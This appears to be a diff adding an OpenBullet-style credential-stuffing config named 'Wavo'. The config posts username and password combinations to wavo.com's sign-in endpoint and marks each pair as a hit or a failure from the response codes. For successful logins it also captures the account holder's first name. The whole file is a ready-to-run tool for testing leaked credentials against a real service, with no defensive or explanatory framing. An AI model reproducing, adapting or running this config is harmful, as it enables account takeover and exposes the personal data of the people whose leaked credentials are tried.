@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "Wavo",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-10-14T13:56:51.5660038+01:00",
+  "AdditionalInfo": "",
+  "Author": "Seliax",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.wavo.com/secure/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&cookielink=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.wavo.com" 
+  HEADER "referer: https://www.wavo.com/secure/signin?parent=https%3A%2F%2Fwww.wavo.com%2F" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "code>loginnotfound</code>" 
+  KEYCHAIN Success OR 
+    KEY "<code>loginsuccess</code>" 
+
+PARSE "<SOURCE>" LR "firstName><![CDATA[" "]]>" -> CAP "First Name" 
+
